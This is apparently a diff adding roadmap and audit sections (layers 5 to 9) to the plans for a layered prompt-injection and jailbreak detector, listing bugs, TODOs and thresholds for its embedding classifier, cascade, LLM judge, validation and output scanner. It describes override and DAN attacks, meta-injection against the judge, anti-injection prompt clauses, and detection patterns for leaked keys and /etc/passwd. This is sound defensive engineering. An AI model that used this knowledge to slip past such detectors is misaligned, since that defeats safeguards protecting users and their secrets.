+- [ ] **Llama 3.2 fine-tuning script** — Format `combined_data.csv` for instruction tuning. Use LoRA/QLoRA with `trl` + `peft` libraries. Target Llama 3.2 1B or 3B as primary classifier replacement. Requires: `transformers`, `peft`, `trl`, `bitsandbytes`. **Priority**: P2. **Effort**: 2-3 days.
+- [ ] **Replace TF-IDF + LogReg with fine-tuned Llama 3.2** — After fine-tuning script is validated, swap primary classifier. Keep TF-IDF as fast fallback for low-latency deployments. **Priority**: P2. **Effort**: 1-2 weeks.
+- [ ] **Perplexity filtering** — Use GPT-2 perplexity as additional signal. Adversarial prompts often have unusual perplexity. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [x] **Wire L3 structural features** — Combine 24 structural features with 5000 TF-IDF features for richer representation. **Priority**: P0. ✅ DONE (2026-02-14)
+- [x] **Wire L5 embedding classifier** — Ensemble TF-IDF + embeddings for better generalization. **Priority**: P0. ✅ DONE (2026-02-14)
+- [ ] **Dataset rebalancing** — Current training data is raw concatenation of jailbreak + safe datasets. No resampling or stratification in base model split. **Priority**: P1.
+- [ ] **Hard negative mining integration** — `scripts/mine_hard_negatives.py` exists but results not yet incorporated into training pipeline. **Priority**: P1.
+
+### Hardcoded Values to Externalize
+| Value | File:Line | Current | Recommendation |
+|-------|-----------|---------|----------------|
+| `DECISION_THRESHOLD` | predict.py:11 | 0.55 | Env-configurable, data-driven |
+| ML weight | predict.py:63 | 0.6 | Named constant, configurable |
+| Obfuscation weight/flag | predict.py:74 | 0.15 | Named constant |
+| Obfuscation cap | predict.py:74 | 0.3 | Named constant |
+| Safe confidence override | predict.py:82 | 0.8 | Named constant, tunable |
+| TF-IDF max_features | features.py:20 | 5000 | Env-configurable |
+| LogReg max_iter | model.py:25 | 10000 | Named constant |
+
+### Test Gaps
+- No dedicated `test_predict.py` — scan() never tested programmatically
+- No test for weighted voting edge cases (override protection, multi-signal stacking)
+- No test for decoded-view reclassification
+- No test for `_L0_FLAG_MAP` completeness
+- No integration test: L0 → L1 → L2 → L4 end-to-end
+- No test for FingerprintStore registration from predict.py
+
+### Implementation Plan
+**Phase 1 (P0 — Critical fixes)**: ~~Fix BUG-L4-1/2/3 (dead flag mappings)~~ done, fix BUG-L4-4 (double-weighting), wire threshold optimizer, ~~wire L3 structural features~~ done, ~~wire L5 embedding classifier~~ done (2026-02-14)
+**Phase 2 (P1 — Core improvements)**: Add n-gram features, model versioning, FN metrics, cross-validation, refactor duplicate rule evaluation, dataset rebalancing, hard negative integration
+**Phase 3 (P2 — Advanced)**: PromptGuard/DeBERTa exploration, perplexity filtering, subword TF-IDF
+
+---
+
+## Layer 5: Embedding Classifier
+
+**Files**: `src/model_embedding.py`, `src/features_embedding.py`, `src/predict_embedding.py`
+**Tests**: None
+**Status**: Implemented and WIRED into cascade.py with 60/40 blending (2026-02-14), L0 sanitization added
+
+### Updated Description
+Layer 5 is an alternative ML classifier using sentence-transformer embeddings (`all-MiniLM-L6-v2`, 384-dim). Features are dense vector representations instead of sparse TF-IDF. Classifier is isotonic-calibrated Logistic Regression (default) or MLP (256, 128 hidden layers). The module has its own parallel pipeline: embed → classify → rule matching → obfuscation scan → weighted decision. Wired into cascade.py as of 2026-02-14 with 60/40 blending alongside weighted classifier. L0 sanitization integrated. Returns an incompatible 4-tuple instead of `ScanResult`. Does NOT use Layer 3 structural features.
+
+### TODO List
+
+#### DONE
+- [x] `all-MiniLM-L6-v2` sentence-transformer embedding model (384-dim, ~20ms/sample) — `features_embedding.py:43`
+- [x] `extract_embeddings()` batch encoding with progress bar (batch_size=64) — `features_embedding.py:61`
+- [x] `build_embedding_features()` end-to-end: load CSV → encode → save pickle — `features_embedding.py:89`
+- [x] LogisticRegression classifier with `class_weight='balanced'`, `C=1.0` — `model_embedding.py:108`
+- [x] Optional MLPClassifier(256, 128) with early stopping — `model_embedding.py:118`
+- [x] Isotonic calibration via `CalibratedClassifierCV(cv=5)` — `model_embedding.py:129`
+- [x] `predict_embedding()` single-text inference — `predict_embedding.py:74`
+- [x] `classify_prompt_embedding()` full pipeline: ML → rules → obfuscation → weighted decision — `predict_embedding.py:113`
+- [x] Decoded-view reclassification through embedding model — `predict_embedding.py:165`
+- [x] Safe pickle serialization via `safe_dump()`/`safe_load()` with SHA-256 sidecar — `model_embedding.py`
+- [x] TF-IDF baseline comparison metrics printed during training — `model_embedding.py:44`
+
+#### FIXES
+- [x] **BUG-L5-1 (HIGH)**: ORPHANED — zero imports from predict.py, cascade.py, or any pipeline code. All 3 files are dead code. **Fix**: Wire into cascade.py as ensemble member alongside TF-IDF. ✅ DONE (2026-02-14) — 60/40 blending with weighted classifier
+- [x] **BUG-L5-2 (HIGH)**: No Layer 0 integration — receives raw unsanitized input. Embeddings encode malformed Unicode, invisible chars, unsanitized HTML. Training data also never sanitized. **Fix**: Call `layer0_sanitize()` before encoding. ✅ DONE (2026-02-14)
+- [ ] **BUG-L5-3 (HIGH)**: Incompatible return type — returns `(label, prob, hits, None)` tuple, not `ScanResult`. Cannot plug into standard scan() API. **Fix**: Return `ScanResult` or create adapter.
+- [ ] **BUG-L5-4 (MEDIUM)**: Aggressive decoded-view flipping — if ANY decoded view is MALICIOUS, immediately flips label regardless of ML confidence on decoded view (line 169-178). No weighted voting for decoded views. **Fix**: Apply same weighted decision logic to decoded views.
+- [ ] **BUG-L5-5 (MEDIUM)**: Hardcoded `ML_CONFIDENCE_OVERRIDE_THRESHOLD = 0.7` (line 46) — not tuned against dataset FP/FN rates. **Fix**: Use threshold optimizer.
+- [ ] **BUG-L5-6 (MEDIUM)**: Rules evaluated on raw text only (line 160) — should also run on L0-sanitized text to catch payloads visible only after normalization. **Fix**: Dual rule pass (raw + sanitized).
+- [ ] **BUG-L5-7 (MEDIUM)**: Training/inference preprocessing mismatch — features_embedding.py loads raw CSV text with no preprocessing; predict_embedding.py receives raw text. Both should match same L0 sanitization pipeline. **Fix**: Sanitize training data before embedding.
+- [ ] **BUG-L5-8 (LOW)**: No error handling on `embedding_model.encode()` — can fail on very long texts (>256 tokens) or wrong input shape. **Fix**: Add try-except with fallback.
+- [ ] **BUG-L5-9 (LOW)**: Hardcoded TF-IDF baseline constants (`TFIDF_ACCURACY = 91.4`, `TFIDF_FPR = 82.8`) — not from this codebase's actual metrics. **Fix**: Compute dynamically or remove.
+- [ ] **FIX-L5-10 (LOW)**: `batch_size=64` hardcoded in features_embedding.py — not configurable. **Fix**: Make parameter.
+- [ ] **FIX-L5-11 (LOW)**: `classify_prompt_embedding()` docstring references `ClassifierOutput.from_tuple()` that doesn't exist (line 136). **Fix**: Remove or implement.
+
+#### NEW (Discovered by research)
+- [ ] **Ensemble with TF-IDF** — Combine L4 (TF-IDF) and L5 (embeddings) predictions. Options: averaging, stacking, Bayesian decision fusion. TF-IDF catches keyword patterns; embeddings catch semantic similarity. **Priority**: P0. **Effort**: Medium.
+- [ ] **Structural feature concatenation** — Append L3's 24 features to 384-dim embedding → 408-dim input to classifier. **Priority**: P1. **Effort**: Easy.
+- [ ] **Contrastive learning** — Fine-tune embedding model on injection/safe pairs. Brings similar attacks closer in embedding space. **Priority**: P2.
+- [ ] **Knowledge distillation** — Train small fast model to mimic ensemble of TF-IDF + embeddings. **Priority**: P2.
+- [ ] **Adapter layer** — Instead of full fine-tuning, add small adapter layers on top of frozen embeddings. Reduces training cost. **Priority**: P2.
+- [ ] **ScanResult wrapper** — Create `scan_embedding()` that returns `ScanResult` for API compatibility with `scan()`. **Priority**: P0. **Effort**: Easy.
+
+#### REMAINING (From original roadmap)
+- [x] **Wire into cascade.py** — Add `EmbeddingClassifier` stage to cascade pipeline. Currently no placeholder exists. **Priority**: P0. ✅ DONE (2026-02-14) — 60/40 blending with weighted classifier
+- [ ] **Stratified train/test split** — model_embedding.py uses stratified split; verify and maintain. **Priority**: P1.
+- [ ] **Model selection** — Benchmark `all-MiniLM-L6-v2` vs `bge-small-en-v1.5` vs `gte-small` for injection detection. **Priority**: P1.
+- [ ] **Fallback mechanism** — If embedding model fails to load, fall back to TF-IDF-only pipeline. **Priority**: P1.
+
+### Hardcoded Values to Externalize
+| Value | File:Line | Current | Recommendation |
+|-------|-----------|---------|----------------|
+| `ML_CONFIDENCE_OVERRIDE_THRESHOLD` | predict_embedding.py:46 | 0.7 | Env-configurable, data-driven |
+| `batch_size` | features_embedding.py:83 | 64 | Configurable parameter |
+| `TFIDF_ACCURACY` | model_embedding.py:44 | 91.4 | Compute dynamically |
+| `TFIDF_FPR` | model_embedding.py:45 | 82.8 | Compute dynamically |
+| MLP hidden layers | model_embedding.py:118 | (256, 128) | Named constant |
+| Embedding model name | features_embedding.py | all-MiniLM-L6-v2 | Env-configurable |
+
+### Test Gaps
+- Zero test coverage — no test files exist for any L5 module
+- Need tests for: embedding extraction, prediction API, obfuscation reclassification, edge cases (empty input, very long text, Unicode), ScanResult compatibility, model loading failures
+
+### Implementation Plan
+**Phase 1 (P0 — Wire & Fix)**: ~~Wire into cascade.py as ensemble member~~ done, ~~add L0 sanitization~~ done (2026-02-14), create ScanResult wrapper, fix aggressive decoded-view flipping
+**Phase 2 (P1 — Improve)**: Add L3 structural features, benchmark alternative models, add stratified splits, fallback mechanism
+**Phase 3 (P2 — Advanced)**: Contrastive learning, knowledge distillation, adapter layers
+
+---
+
+## Layer 6: Cascade & Weighted Voting
+
+**Files**: `src/cascade.py` (405 lines)
+**Tests**: None
+**Status**: Implemented — integrates L0, L1, L2, L3, L5, L7, L8, L9, L10 (L0/L3/L5/L7/L8/L9/L10 wired 2026-02-14)
+
+### Updated Description
+Layer 6 implements a 2-3 stage cascade architecture designed to reduce false positives by 70-90%. Stage 1 (`WhitelistFilter`) fast-tracks obviously-safe prompts via pattern matching (question words, length ≤500 chars, ≤3 sentences, no boundary markers/obfuscation/role assignment). Stage 2 (`WeightedClassifier`) runs TF-IDF ML + rule severity stacking + obfuscation signals with same weighted voting as predict.py (ML 60%, rules severity-stacked, obfuscation 15%/flag capped 30%, threshold 0.55). Stage 3 (`CascadeClassifier`) optionally routes ambiguous cases (confidence 0.25-0.85) to the LLM Judge (L7), blending confidences 30% ML + 70% judge. Returns 4-tuple `(label, confidence, hits, stage)`. Now calls `layer0_sanitize()` (L0 stub replaced 2026-02-14). Integrates L3 structural features, L5 embedding classifier (60/40 blend), L7 LLM judge (lazy-init, ambiguous routing), L8 positive validation (post-classification FP reduction), L9 output scanner (scan_output method), and L10 canary tokens (inject/check/report).
+
+### Pipeline Flow
+```
+CascadeClassifier.classify(text)
+  → Stage 1: WhitelistFilter.is_whitelisted(text)
+     ├─ question pattern + no boundaries + no obfuscation + ≤500 chars + ≤3 sentences
+     ├─ If safe → return ("SAFE", 0.99, [], "whitelist")
+     └─ If unclear → continue
+  → Stage 2: WeightedClassifier.classify(text, vectorizer, model)
+     ├─ TF-IDF transform → predict_proba → P(malicious)
+     ├─ rule_score_detailed(text) → severity stacking
+     ├─ obfuscation_scan(text) → evasion flags
+     ├─ composite = 0.6×ml + rule_weight + obf_weight (clamped 0-1)
+     ├─ Override: ML >0.8 safe + only medium rules + no obf → SAFE
+     └─ Threshold: composite ≥ 0.55 → MALICIOUS
+  → Stage 3 (optional): LLMJudge
+     ├─ If 0.25 ≤ confidence ≤ 0.85 OR (MALICIOUS + confidence < 0.85)
+     ├─ call judge.classify(text)
+     ├─ blend: 0.3 × Stage2 + 0.7 × Judge
+     └─ return (label, confidence, hits, "judge")
+```
+
+### TODO List
+
+#### DONE
+- [x] `WhitelistFilter` — 6-criteria fast-path gate for obviously safe prompts — `cascade.py:33`
+- [x] `WeightedClassifier` — ML + rules + obfuscation weighted voting (mirrors predict.py logic) — `cascade.py:135`
+- [x] `CascadeClassifier` — 3-stage router with optional LLM judge — `cascade.py:239`
+- [x] `_L0Stub` — compatibility shim for probe evaluation framework — `cascade.py:224`
+- [x] `classify_for_evaluate()` — adapter for taxonomy probe system — `cascade.py:328`
+- [x] Stats tracking: total, whitelisted, classified, judged, judge_overrides, blocked — `cascade.py:260`
+- [x] Judge routing thresholds: lower 0.25, upper 0.85 — `cascade.py:249`
+- [x] Confidence blending: 30% ML + 70% judge — `cascade.py:320`
+- [x] Integration with L1 rules and L2 obfuscation
+
+#### FIXES
+- [x] **BUG-L6-1 (HIGH)**: No Layer 0 integration — uses `_L0Stub` instead of `layer0_sanitize()`. All cascade input is unsanitized. Unicode tricks, invisible chars, HTML injection all bypass L0 defenses. **Fix**: Call `layer0_sanitize()` at top of `classify()`. ✅ DONE (2026-02-14)
+- [ ] **BUG-L6-2 (HIGH)**: Override protection conflicts with threshold — if ML >0.8 safe and only medium rules, returns SAFE even when composite ≥ 0.55 (above threshold). Override can suppress valid MALICIOUS decisions. **Fix**: Only override when composite < threshold.
+- [ ] **BUG-L6-3 (MEDIUM)**: `_SEVERITY_WEIGHTS` duplicated from predict.py — identical copy at cascade.py:142. Maintenance hazard (change one, forget the other). **Fix**: Extract to `rules.py` or shared config.
+- [ ] **BUG-L6-4 (MEDIUM)**: Confidence reporting inconsistency — SAFE returns `1.0 - score`, MALICIOUS returns `score`. Mixed semantics (P(label correct) vs composite score). **Fix**: Use consistent P(label correct) for both.
+- [ ] **BUG-L6-5 (MEDIUM)**: Judge blending mixes metrics — Stage 2 confidence is "composite score" (0-1), judge confidence is "P(verdict correct)". Blending 0.3×composite + 0.7×P(correct) is semantically meaningless. **Fix**: Normalize both to same scale before blending.
+- [ ] **BUG-L6-6 (MEDIUM)**: WhitelistFilter MAX_LENGTH=500 too restrictive — legitimate documentation excerpts, code snippets, and detailed questions often exceed 500 chars. **Fix**: Raise to 1000-1500 or make configurable.
+- [ ] **BUG-L6-7 (LOW)**: Empty/whitespace-only text — no explicit check. `_count_sentences("")` returns 0, whitespace-only text passes. **Fix**: Add empty-check at top of `is_whitelisted()`.
+- [ ] **BUG-L6-8 (LOW)**: `WhitelistFilter.ROLE_ASSIGNMENT` pattern diverges from `rules.py` roleplay pattern. Different regex, different coverage. **Fix**: Share patterns with rules.py.
+
+#### NEW (Discovered by research)
+- [ ] **Create `ChainIntegrityTracker`** — Trust score propagation across multi-LLM pipeline stages; degrade trust when intermediate outputs show injection signals. Standalone utility for multi-hop pipelines. Source: IM0006 Coverage Gap #9. **Priority**: P1. **Effort**: Medium.
+- [x] **Wire L3 structural features into Stage 2** — Use injection signals (imperative_start, role_assignment, instruction_boundary) as additional voting signal. **Priority**: P0. **Effort**: Easy. ✅ DONE (2026-02-14)
+- [x] **Wire L5 embedding classifier into Stage 2** — Add embedding prediction as parallel signal to TF-IDF. Ensemble via averaging or stacking. **Priority**: P0. **Effort**: Medium. ✅ DONE (2026-02-14) — 60/40 blending
+- [x] **Wire L8 positive validation as Stage 2.5** — After ML but before judge, validate that input looks like a legitimate prompt. Could reduce judge invocations. **Priority**: P1. ✅ DONE (2026-02-14) — post-classification FP reduction
+- [ ] **Bayesian decision fusion** — Replace linear composite with Bayesian evidence accumulation. Better handles correlated signals. **Priority**: P2.
+- [ ] **Configurable stage pipeline** — Allow runtime configuration of which stages run and in what order. **Priority**: P1. **Effort**: Medium.
+- [ ] **Batch classification** — `classify()` is single-text only. Add `classify_batch()` for throughput. **Priority**: P1.
+- [ ] **Paranoid confidence mode** — Add configurable `uncertain_action = "block"` mode. Current default returns SAFE when uncertain (threshold 0.55). AI WAF best practice: "if unsure, block." Add env-configurable flag to flip default for high-security deployments. **Priority**: P1. **Effort**: Easy.
+
+#### REMAINING (From original roadmap)
+- [ ] **Stacking classifier** — Train meta-learner on top of Stage 2 features for better calibration. **Priority**: P2.
+- [ ] **Performance SLO** — Track and enforce latency targets per stage (e.g., whitelist <1ms, weighted <10ms, judge <5s). **Priority**: P1.
+
+### Hardcoded Values to Externalize
+| Value | Location | Current | Recommendation |
+|-------|----------|---------|----------------|
+| `SEVERITY_WEIGHTS` | cascade.py:142 | Duplicated from predict.py | Extract to shared config |
+| `ML_WEIGHT` | cascade.py:148 | 0.6 | Named constant, configurable |
+| `OBFUSCATION_WEIGHT_PER_FLAG` | cascade.py:149 | 0.15 | Named constant |
+| `OBFUSCATION_WEIGHT_CAP` | cascade.py:150 | 0.3 | Named constant |
+| `DEFAULT_THRESHOLD` | cascade.py:151 | 0.55 | Env-configurable |
+| `JUDGE_LOWER_THRESHOLD` | cascade.py:250 | 0.25 | Configurable |
+| `JUDGE_UPPER_THRESHOLD` | cascade.py:251 | 0.85 | Configurable |
+| `MAX_LENGTH` | cascade.py:77 | 500 | Raise or make configurable |
+| `MAX_SENTENCES` | cascade.py:78 | 3 | Make configurable |
+| Safe confidence override | cascade.py:208 | 0.8 | Configurable |
+| Judge blend ratio | cascade.py:320 | 0.3/0.7 | Configurable |
+
+### Test Gaps
+- Zero test coverage — no `test_cascade.py`
+- Need tests for: WhitelistFilter edge cases, WeightedClassifier voting, override protection, judge routing, judge blending, `classify_for_evaluate()`, stats tracking, empty/whitespace input
+
+### Implementation Plan
+**Phase 1 (P0 — Critical fixes)**: ~~Wire L0 into cascade~~ done, fix override/threshold conflict (BUG-L6-2), extract shared severity weights, ~~wire L3 and L5~~ done (2026-02-14). Also wired L7, L8, L9, L10.
+**Phase 2 (P1 — Improvements)**: Raise MAX_LENGTH, ~~add L8 validation stage~~ done (2026-02-14), configurable pipeline, batch classification, performance SLO
+**Phase 3 (P2 — Advanced)**: Bayesian fusion, stacking meta-learner
+
+---
+
+## Layer 7: LLM Judge
+
+**Files**: `src/llm_judge.py` (386 lines), `src/llm_checker.py` (75 lines, deprecated)
+**Tests**: None (evaluation script exists: `scripts/evaluate_llm_judge.py`)
+**Status**: Implemented — integrated into cascade.py Stage 3
+
+### Updated Description
+Layer 7 provides semantic evaluation of ambiguous prompts using an LLM as a judge. Supports dual backends (OpenAI `gpt-4o-mini` and Groq `llama-3.3-70b-versatile`) with graceful degradation. Uses a 4-pair few-shot prompt designed to minimize FPs on educational/benign inputs containing dangerous-looking keywords. Returns `JudgeVerdict` dataclass (frozen) with verdict, confidence, reasoning, latency, model, and error fields. Includes self-consistency voting (3 calls at temperature 0.5, majority vote) and a circuit breaker wrapper (5 failures → 60s open). The older `llm_checker.py` is a simpler Groq-only prototype without few-shot examples, self-consistency, or circuit breaker — it should be deprecated.
+
+### TODO List
+
+#### DONE
+- [x] `LLMJudge` class with dual-backend support (OpenAI + Groq) — `llm_judge.py:152`
+- [x] `JudgeVerdict` frozen dataclass: verdict, confidence, reasoning, latency_ms, model, error — `llm_judge.py:36`
+- [x] System prompt with clear injection definition + non-injection examples — `llm_judge.py:52`
+- [x] 4-pair few-shot examples (override attack, educational question, benign code request, DAN jailbreak) — `llm_judge.py:81`
+- [x] JSON-mode response format (OpenAI-specific) — `llm_judge.py:209`
+- [x] Graceful fallback: keyword heuristic if JSON parse fails ("malicious" in content) — `llm_judge.py:305`
+- [x] `classify_with_consistency()` — 3-call majority vote at temperature 0.5 — `llm_judge.py:227`
+- [x] `LLMJudgeWithCircuitBreaker` — 5-failure threshold, 60s reset window — `llm_judge.py:344`
+- [x] Integration with cascade.py Stage 3 — ambiguous-zone routing (0.25-0.85)
+- [x] Evaluation script: `scripts/evaluate_llm_judge.py` (TP/FP/TN/FN, FPR/FNR, latency p50/p95)
+
+#### FIXES
+- [ ] **BUG-L7-1 (MEDIUM)**: JSON parsing fragile — uses `content.find("{")` and `rfind("}")` to extract JSON. Fails on nested JSON or markdown code blocks containing `{}`. **Fix**: Use `json.loads()` with proper extraction regex.
+- [ ] **BUG-L7-2 (MEDIUM)**: Keyword fallback too broad — `"malicious" in content.lower()` catches educational text discussing malicious content. **Fix**: Require keyword in specific JSON-like context or remove fallback.
+- [ ] **BUG-L7-3 (MEDIUM)**: Self-consistency majority vote — if 1 SAFE + 1 MALICIOUS + 1 UNKNOWN, SAFE wins because `safe_count > malicious_count` succeeds (1 > 1 = False, falls to SAFE default). UNKNOWN votes effectively support SAFE. **Fix**: Exclude UNKNOWN from vote count.
+- [ ] **BUG-L7-4 (LOW)**: Confidence in self-consistency — `malicious_count / len(verdicts)` includes UNKNOWNs in denominator, diluting confidence. **Fix**: Divide by non-UNKNOWN count.
+- [ ] **BUG-L7-5 (LOW)**: `verdict.reasoning` discarded by cascade.py — no audit trail of why judge decided. **Fix**: Include reasoning in ScanResult or log it.
+- [ ] **BUG-L7-6 (LOW)**: No input truncation — very long inputs could exceed LLM context window. Few-shot + system prompt + long input → token limit. **Fix**: Truncate input to safe length (e.g., 4000 chars).
+- [ ] **FIX-L7-7**: Deprecate `llm_checker.py` — superseded by `llm_judge.py` in every way. **Fix**: Remove file, update any references.
+
+#### NEW (Discovered by research)
+- [ ] **Harden against meta-injection** — Wrap user input in explicit `<user_input>` delimiters, add anti-injection clause to JUDGE_SYSTEM_PROMPT, schema-validate `_parse_response()` output, add nonce-based verification (random string judge must echo back). Source: IM0006 Coverage Gap #6, Vulnerability at llm_judge.py:293-298. **Priority**: P0. **Effort**: Medium.
+- [ ] **Response caching** — LRU cache for repeated identical inputs. Saves API cost and reduces latency. **Priority**: P1. **Effort**: Easy (functools.lru_cache or dict).
+- [ ] **Token counting** — Count tokens before API call using tiktoken. Truncate if exceeding model context. **Priority**: P1. **Effort**: Easy.
+- [ ] **Exponential backoff** — Retry transient failures (429, 503) with jitter. **Priority**: P1. **Effort**: Easy.
+- [ ] **Open-source judge** — Use local model (e.g., Llama-3-8B via Ollama) as fallback when cloud APIs unavailable. Eliminates dependency. **Priority**: P2.
+- [ ] **Chain-of-thought judging** — Add CoT reasoning step before verdict. Research shows improved accuracy. **Priority**: P2.
+- [ ] **Cost tracking** — Log token usage and cost per call. Monthly budget enforcement. **Priority**: P1.
+- [ ] **Audit logging** — Log every judge invocation: input hash, verdict, confidence, reasoning, model, latency. **Priority**: P1.
+- [ ] **Request timeout enforcement** — Configurable per-request timeout (beyond the hardcoded 10s). Add to LLM judge and any ported LLM checker. **Priority**: P1. **Effort**: Easy.
+- [ ] **Rate limiting** — Add token bucket or leaky bucket rate limiter for API calls. Prevent burst costs and API bans. **Priority**: P1. **Effort**: Medium.
+
+#### REMAINING (From original roadmap)
+- [x] **Self-consistency voting** — Already implemented. ✅ DONE (2026-02-14)
+- [x] **Circuit breaker** — Already implemented. ✅ DONE (2026-02-14)
+
+### Hardcoded Values to Externalize
+| Value | File:Line | Current | Recommendation |
+|-------|-----------|---------|----------------|
+| Default model (OpenAI) | llm_judge.py | gpt-4o-mini | Env-configurable |
+| Default model (Groq) | llm_judge.py | llama-3.3-70b-versatile | Env-configurable |
+| Temperature | llm_judge.py:164 | 0.0 | Named constant |
+| Timeout | llm_judge.py:159 | 10.0s | Named constant |
+| Circuit breaker threshold | llm_judge.py:348 | 5 failures | Configurable |
+| Circuit breaker reset | llm_judge.py:351 | 60s | Configurable |
+| Self-consistency calls | llm_judge.py:227 | 3 | Configurable |
+| Self-consistency temperature | llm_judge.py | 0.5 | Configurable |
+| Judge routing thresholds | cascade.py:249-251 | 0.25/0.85 | Configurable |
+| Judge blend ratio | cascade.py:320 | 0.3/0.7 | Configurable |
+
+### Test Gaps
+- Zero unit tests — no `test_llm_judge.py`
+- Evaluation script exists but is not a unit test suite
+- Need tests for: JSON parsing edge cases, keyword fallback, self-consistency voting, circuit breaker state machine, graceful degradation, UNKNOWN handling
+
+### Implementation Plan
+**Phase 1 (P0)**: Deprecate llm_checker.py, fix JSON parsing, add input truncation
+**Phase 2 (P1)**: Add response caching, token counting, exponential backoff, cost tracking, audit logging
+**Phase 3 (P2)**: Open-source local judge fallback, chain-of-thought judging
+
+---
+
+## Layer 8: Positive Validation
+
+**Files**: `src/positive_validation.py` (467 lines)
+**Tests**: None
+**Status**: Implemented and WIRED into cascade.py as post-classification FP reduction (2026-02-14)
+
+### Updated Description
+Layer 8 validates that input looks like a legitimate user prompt through 5 multi-level checks: coherence (readable text, not encoded), intent (has question word or verb), scope (single bounded request, task-specific length limits), persona boundary (no role hijack or system prompt markers), and task match (fits declared task type: general/summarization/qa/coding). Also includes a `TrustBoundary` class implementing sandwich defense (wraps system prompts with trust markers + untrusted user input markers). Returns `ValidationResult` dataclass (is_valid, confidence, reason, task_match). Wired into cascade.py as of 2026-02-14 for post-classification FP reduction.
+
+### TODO List
+
+#### DONE
+- [x] `ValidationResult` dataclass: is_valid, confidence, reason, task_match — `positive_validation.py:27`
+- [x] `PositiveValidator` class with 5 validation checks — `positive_validation.py:107`
+  - [x] Coherence check: avg word length, long-word ratio, alphabetic density — line 183
+  - [x] Intent check: question words (16), common verbs (58), question mark — line 214
+  - [x] Scope check: task-specific max lengths, instruction boundaries (<3), contradiction detection — line 234
+  - [x] Persona boundary check: 11 override patterns, 13 system prompt markers — line 280
+  - [x] Task match check: general/summarization/qa/coding with keyword matching — line 300
+- [x] `TrustBoundary` class: sandwich defense with trust markers — `positive_validation.py:343`
+  - [x] `wrap_system_prompt(system_prompt, user_input)` — wraps with `[TRUSTED]...[USER UNTRUSTED]...[REMINDER]`
+  - [x] `extract_user_input(wrapped_text)` — extracts untrusted section
+- [x] 8 demo test cases in `__main__` block — line 400
+- [x] Task-specific max lengths: general 2000, summarization 10000, qa 1000, coding 5000
+
+#### FIXES
+- [x] **BUG-L8-1 (HIGH)**: ORPHANED — zero imports from any pipeline code. 467 lines of dead code. **Fix**: Wire into cascade.py as Stage 2.5 (after ML, before judge) or into predict.py as post-classification filter. ✅ DONE (2026-02-14) — wired into cascade.py for post-classification FP reduction
+- [ ] **BUG-L8-2 (HIGH)**: No Layer 0 integration — receives raw unsanitized text. **Fix**: Accept sanitized text from L0.
+- [ ] **BUG-L8-3 (MEDIUM)**: Coherence check alpha_ratio 30% threshold — rejects legitimate code snippets, JSON, URLs, log output. **Fix**: Adjust threshold per task_type (coding → 15%, general → 30%).
+- [ ] **BUG-L8-4 (MEDIUM)**: Contradiction detection window `{1,40}` too narrow — attacks can space contradictions further apart. **Fix**: Widen window or use sentence-level detection.
+- [ ] **BUG-L8-5 (MEDIUM)**: Persona override patterns not shared with rules.py — 11 patterns in positive_validation.py, different patterns in rules.py and cascade.py. Triple maintenance. **Fix**: Consolidate into shared pattern library.
+- [ ] **BUG-L8-6 (LOW)**: Coherence avg_word_len threshold of 45 — arbitrary, no justification. Long technical words (cryptocurrency, authentication) are normal. **Fix**: Raise or use per-task thresholds.
+- [ ] **BUG-L8-7 (LOW)**: No error handling for non-string input — `text.split()` will crash on None. **Fix**: Add type guard.
+
+#### NEW (Discovered by research)
+- [ ] **Taxonomy mapping** — Map validation failures to technique IDs. Persona override → D2.x, system prompt markers → D3.x, low coherence → D4.x (obfuscation). **Priority**: P0.
+- [ ] **Configurable check weights** — Currently all 4 checks weighted equally (mean). Allow per-check weighting (persona boundary should outweigh coherence). **Priority**: P1.
+- [ ] **Output validation mode** — Currently validates input only. Add mode to validate LLM output for successful injection signs (role break, system prompt leak). **Priority**: P1.
+- [ ] **Persistent allowlist database** — Corpus of known-safe patterns for fast-path validation. **Priority**: P2.
+- [ ] **Multi-turn context** — Track validation results across conversation turns. Detect gradual escalation. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [x] **Wire into pipeline** — Add as validation stage in cascade.py or predict.py. **Priority**: P0. ✅ DONE (2026-02-14) — wired into cascade.py
+- [ ] **Consolidate regex patterns** — Share persona/boundary patterns with rules.py and cascade.py. **Priority**: P1.
+
+### Hardcoded Values to Externalize
+| Value | Location | Current | Recommendation |
+|-------|----------|---------|----------------|
+| avg_word_len threshold | positive_validation.py:193 | 45 | Per-task configurable |
+| long_ratio threshold | positive_validation.py:199 | 0.15 | Named constant |
+| alpha_ratio threshold | positive_validation.py:205 | 0.30 | Per-task configurable |
+| coherence score formula | positive_validation.py:209 | 0.4 + long×0.3 + alpha×0.3 | Configurable weights |
+| scope max_length by task | positive_validation.py:242-247 | task-specific (1000-10000) | Env-configurable |
+| boundary_count threshold | positive_validation.py:255 | ≥3 | Configurable |
+| contradiction window | positive_validation.py:263 | 1-40 chars | Widen or make configurable |
+
+### Test Gaps
+- Zero test coverage — no `test_positive_validation.py`
+- Need tests for: all 5 check methods, task types, edge cases (empty, None, very long, code, JSON), TrustBoundary wrapping/extraction, threshold boundary conditions, interaction with L0 sanitized text
+
+### Implementation Plan
+**Phase 1 (P0 — Wire & Fix)**: ~~Wire into cascade.py as Stage 2.5~~ done (2026-02-14), add taxonomy mapping, consolidate shared regex patterns, fix alpha_ratio for code
+**Phase 2 (P1 — Improve)**: Configurable check weights, output validation mode, per-task thresholds
+**Phase 3 (P2 — Extend)**: Persistent allowlist, multi-turn context tracking
+
+---
+
+## Layer 9: Output Scanner
+
+**Files**: `src/output_scanner.py` (422 lines)
+**Tests**: None
+**Status**: Implemented and WIRED into cascade.py via scan_output() method (2026-02-14)
+
+### Updated Description
+Layer 9 scans LLM **output** (post-generation) to catch injections that evade input filters. Implements 6 detection categories with 17 regex patterns: secret/credential detection (AWS, OpenAI, GitHub, Slack, JWT, passwords), role-break indicators (DAN/jailbreak phrases), compliance echoing (accepting injection commands), system prompt leak detection (trigram overlap), and encoded data detection (base64, hex, URL-encoded). Supports 3 sensitivity levels (low/medium/high) with different weight multipliers and thresholds. Returns `OutputScanResult` dataclass with is_suspicious, risk_score, flags, and redacted_text. Wired into cascade.py as of 2026-02-14 via scan_output() method.
+
+### TODO List
+
+#### DONE
+- [x] `OutputScanResult` dataclass: is_suspicious, risk_score, flags, redacted_text — `output_scanner.py`
+- [x] `OutputScanner` class with configurable sensitivity levels (low/medium/high)
+- [x] Secret pattern detection: AWS keys, OpenAI/Anthropic keys, GitHub tokens, Slack tokens, passwords, API keys, Bearer tokens, JWT, /etc/passwd, System32 — 13 regex patterns
